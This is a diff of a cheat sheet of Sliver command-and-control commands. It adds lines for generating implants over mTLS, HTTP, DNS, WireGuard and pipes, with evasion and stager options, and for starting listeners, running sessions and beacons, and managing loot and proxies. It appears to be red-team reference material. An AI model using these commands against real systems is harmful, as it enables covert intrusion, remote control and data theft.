@@ -19,85 +19,163 @@ sliver client
 ## List Active Listeners
 #cat/UTILS 
 ```
-listeners
+jobs
 ```
 
-## Generate Windows EXE Payload
+## Generate Windows EXE with mTLS
 #cat/PAYLOAD 
 ```
-generate --os windows --arch amd64 --format exe --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --mtls <lhost>
 ```
 
-## Generate Windows DLL Payload
+## Generate Windows EXE with HTTP
 #cat/PAYLOAD 
 ```
-generate --os windows --arch amd64 --format dll --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --http <lhost>:<lport>
 ```
 
-## Generate Windows Shellcode Payload
+## Generate Windows EXE with HTTPS
 #cat/PAYLOAD 
 ```
-generate --os windows --arch amd64 --format shellcode --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --https <lhost>:<lport>
 ```
 
-## Generate Linux Executable Payload
+## Generate Windows EXE with DNS
 #cat/PAYLOAD 
 ```
-generate --os linux --arch amd64 --format exe --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --dns <lhost>
 ```
 
-## Generate Linux Shellcode Payload
+## Generate Windows EXE with WireGuard
 #cat/PAYLOAD 
 ```
-generate --os linux --arch amd64 --format shellcode --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --wg <lhost>:<lport> --key-exchange <lport> --tcp-comms <lport>
 ```
 
-## Generate MacOS Executable Payload
+## Generate Windows EXE with Named Pipe
 #cat/PAYLOAD 
 ```
-generate --os darwin --arch amd64 --format exe --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --named-pipe <pipe_name>
 ```
 
-## Generate MacOS Shellcode Payload
+## Generate Windows EXE with TCP Pivot
 #cat/PAYLOAD 
 ```
-generate --os darwin --arch amd64 --format shellcode --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --tcp-pivot <lhost>:<lport>
 ```
 
-## Generate Websocket Payload
+## Generate Windows DLL with mTLS
 #cat/PAYLOAD 
 ```
-generate --ws --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --format shared --mtls <lhost>
 ```
 
-## Generate HTTP Payload
+## Generate Windows Shellcode with mTLS
 #cat/PAYLOAD 
 ```
-generate --http --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --format shellcode --mtls <lhost>
 ```
 
-## Generate DNS Payload
+## Generate Linux ELF with mTLS
 #cat/PAYLOAD 
 ```
-generate --dns --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --os linux --mtls <lhost>
 ```
 
-## Generate MTLS Payload
+## Generate Linux ELF with HTTP
 #cat/PAYLOAD 
 ```
-generate --mtls --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --os linux --http <lhost>:<lport>
 ```
 
-## Generate with Custom Profile
+## Generate MacOS Mach-O with mTLS
 #cat/PAYLOAD 
 ```
-generate --profile <profile_name> --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --os mac --mtls <lhost>
 ```
 
-## Generate with Custom C2
+## Generate MacOS Mach-O with HTTP
 #cat/PAYLOAD 
 ```
-generate --c2 <c2_url> --lhost <callback_ip> --lport <callback_port> --save <output_path>
+generate --os mac --http <lhost>:<lport>
+```
+
+## Generate with Multiple C2 Protocols
+#cat/PAYLOAD 
+```
+generate --os linux --mtls <lhost>,<lhost2> --http <lhost>:<lport>,<lhost2>:<lport> --dns <lhost>
+```
+
+## Generate with DNS Canary
+#cat/PAYLOAD 
+```
+generate --mtls <lhost> --canary <canary_domain>
+```
+
+## Generate with Execution Limits
+#cat/PAYLOAD 
+```
+generate --mtls <lhost> --limit-hostname <hostname> --limit-username <user> --limit-domainjoined
+```
+
+## Generate with Evasion Features
+#cat/PAYLOAD 
+```
+generate --mtls <lhost> --evasion
+```
+
+## Generate with Debug Features
+#cat/PAYLOAD 
+```
+generate --mtls <lhost> --debug
+```
+
+## Generate Beacon Binary
+#cat/PAYLOAD 
+```
+generate beacon --mtls <lhost>
+```
+
+## Generate Stager with Metasploit
+#cat/PAYLOAD 
+```
+generate stager --mtls <lhost>
+```
+
+## Start mTLS Listener
+#cat/LISTENER 
+```
+mtls --lhost <lhost> --lport <lport>
+```
+
+## Start HTTP Listener
+#cat/LISTENER 
+```
+http --lhost <lhost> --lport <lport>
+```
+
+## Start HTTPS Listener
+#cat/LISTENER 
+```
+https --lhost <lhost> --lport <lport>
+```
+
+## Start DNS Listener
+#cat/LISTENER 
+```
+dns --lhost <lhost> --lport <lport>
+```
+
+## Start WireGuard Listener
+#cat/LISTENER 
+```
+wg --lhost <lhost> --lport <lport>
+```
+
+## Start Stage Listener
+#cat/LISTENER 
+```
+stage-listener --lhost <lhost> --lport <lport>
 ```
 
 ## List Available Profiles
@@ -109,7 +187,7 @@ profiles
 ## Show Generate Help
 #cat/UTILS 
 ```
-generate --help
+help generate
 ```
 
 ## Show Available Commands
@@ -130,10 +208,22 @@ implants
 sessions
 ```
 
+## List Beacons
+#cat/UTILS 
+```
+beacons
+```
+
 ## Use Session
 #cat/COMMAND 
 ```
 use <session_id>
+```
+
+## Background Session
+#cat/COMMAND 
+```
+background
 ```
 
 ## Execute Command on Session
@@ -194,4 +284,136 @@ cd <path>
 #cat/COMMAND 
 ```
 pwd
+```
+
+## Manage Loot Store
+#cat/UTILS 
+```
+loot
+```
+
+## List Canaries
+#cat/UTILS 
+```
+canaries
+```
+
+## Monitor Threat Intel
+#cat/UTILS 
+```
+monitor
+```
+
+## Generate WireGuard Config
+#cat/UTILS 
+```
+wg-config
+```
+
+## List WireGuard Port Forwards
+#cat/UTILS 
+```
+wg-portfwd
+```
+
+## List WireGuard SOCKS Servers
+#cat/UTILS 
+```
+wg-socks
+```
+
+## Manage Websites (HTTP C2)
+#cat/UTILS 
+```
+websites
+```
+
+## Manage Tasks (Beacon)
+#cat/UTILS 
+```
+tasks
+```
+
+## Manage Hosts Database
+#cat/UTILS 
+```
+hosts
+```
+
+## Manage Environment Variables
+#cat/UTILS 
+```
+env
+```
+
+## Manage Settings
+#cat/UTILS 
+```
+settings
+```
+
+## Manage Reactions
+#cat/UTILS 
+```
+reaction
+```
+
+## Regenerate Implant
+#cat/UTILS 
+```
+regenerate
+```
+
+## List External Builders
+#cat/UTILS 
+```
+builders
+```
+
+## Manage Aliases
+#cat/UTILS 
+```
+aliases
+```
+
+## Armory (Extensions)
+#cat/UTILS 
+```
+armory
+```
+
+## Cursed (Chrome/Electron)
+#cat/UTILS 
+```
+cursed
+```
+
+## Manage Operators
+#cat/UTILS 
+```
+operators
+```
+
+## Check for Updates
+#cat/UTILS 
+```
+update
+```
+
+## Display Version
+#cat/UTILS 
+```
+version
+```
+
+## Clear Screen
+#cat/UTILS 
+```
+clear
+```
+
+## Exit Sliver
+#cat/UTILS 
+```
+exit
 ```
